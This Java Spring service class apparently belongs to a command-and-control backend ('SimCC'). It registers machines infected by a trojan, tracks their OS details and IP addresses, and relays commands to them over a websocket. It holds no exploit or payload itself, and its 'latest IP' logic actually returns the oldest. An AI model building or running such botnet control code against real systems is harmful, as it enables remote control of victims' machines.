package at.simcc.simcc_backend.api.service;

import at.simcc.simcc_backend.api.body.InfectedRegistrationRequest;
import at.simcc.simcc_backend.api.ws.SimccMessage;
import at.simcc.simcc_backend.api.ws.MessageType;
import at.simcc.simcc_backend.api.ws.WebsocketHandler;
import at.simcc.simcc_backend.api.ws.payload.CommandOutputPayload;
import at.simcc.simcc_backend.api.ws.payload.CommandPayload;
import at.simcc.simcc_backend.entities.Infected;
import at.simcc.simcc_backend.entities.InfectedIP;
import at.simcc.simcc_backend.entities.Trojan;
import at.simcc.simcc_backend.mapper.InfectedMapper;
import at.simcc.simcc_backend.models.InfectedIdDto;
import at.simcc.simcc_backend.models.InfectedWithLatestIPDto;
import at.simcc.simcc_backend.repo.InfectedRepository;
import at.simcc.simcc_backend.repo.TrojanRepository;
import jakarta.persistence.EntityNotFoundException;
import lombok.RequiredArgsConstructor;
import org.jspecify.annotations.Nullable;
import org.springframework.stereotype.Service;
import tools.jackson.databind.ObjectMapper;

import java.io.IOException;
import java.net.Inet4Address;
import java.time.LocalDate;
import java.util.*;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.TimeoutException;

/**
 * Project: SimCC-Backend
 * Created by: Georg Kollegger
 * Date: 4/10/26
 */
@Service
@RequiredArgsConstructor
public class InfectedService {
    private final InfectedRepository infectedRepo;
    private final TrojanRepository trojanRepository;
    private final InfectedRepository infectedRepository;

    private final InfectedMapper infectedMapper;
    private final WebsocketHandler websocketHandler;
    private final ObjectMapper objectMapper;

    /**
     * Register a new infected machine using a {@code ccid}
     * @param ccid a {@code ccid} used to check whether a valid trojan session is used
     * @throws EntityNotFoundException when the {@code ccid} was invalid
     */
    public Optional<InfectedIdDto> registerInfected(InfectedRegistrationRequest req, Optional<Inet4Address> ip) {
        Optional<Trojan> optTrojan = trojanRepository.findTrojanByCcid(req.ccid());

        if (optTrojan.isEmpty()) return Optional.empty();

        Infected infected = Infected.builder()
                .trojan(optTrojan.get())
                .osType(req.osType())
                .osVersion(req.osVersion())
                .osEdition(req.osEdition())
                .osCodeName(req.osCodeName())
                .osBits(req.osBits())
                .osArch(req.osArch())
                .build();

        infected.setInfectedIPS(
                ip.map(inet4Address -> List.of(
                        InfectedIP.builder()
                                .ip(inet4Address)
                                .since(LocalDate.now())
                                .infected(infected)
                                .build()
                )).orElseGet(List::of)
        );

        Infected saved = infectedRepository.save(
                infected
        );

        return Optional.of(infectedMapper.toDtoId(saved));
    }

    /**
     * Returns all infected systems by our virus
     * @latestIpAddress -> the last used ip address
     */
    public List<InfectedWithLatestIPDto> getAllInfected() {
        List<Infected> infectends = infectedRepo.findAll();
        List<InfectedWithLatestIPDto> infectedDtos = new ArrayList<>();
        for (Infected infected : infectends){
            infected.setOnline(
                    websocketHandler.isConnected(infected.getIid())
            );
            InfectedWithLatestIPDto infectedWithLatestIPDto
                    = infectedMapper.toInfectedWIthLatestIPDto(infected);

            infectedWithLatestIPDto.setLatestIpAddress(
                    infected.getInfectedIPS()
                            .stream()
                            .sorted(Comparator.comparing(InfectedIP::getSince))
                            .map(i -> i.getIp().getHostAddress())
                            .findFirst()
                            .orElse(null)
            );

            infectedDtos.add(
                    infectedWithLatestIPDto
            );
        }

        return infectedDtos;
    }

    public CommandOutputPayload sendMessage(UUID iid, CommandPayload command) throws IOException, ExecutionException, InterruptedException, TimeoutException {
        return (CommandOutputPayload) websocketHandler.sendMessageToInfectedAndWait(iid,
                SimccMessage.builder()
                        .type(MessageType.COMMAND)
                        .payload(
                                objectMapper.valueToTree(
                                        command
                                )
                        ).build());
    }
}
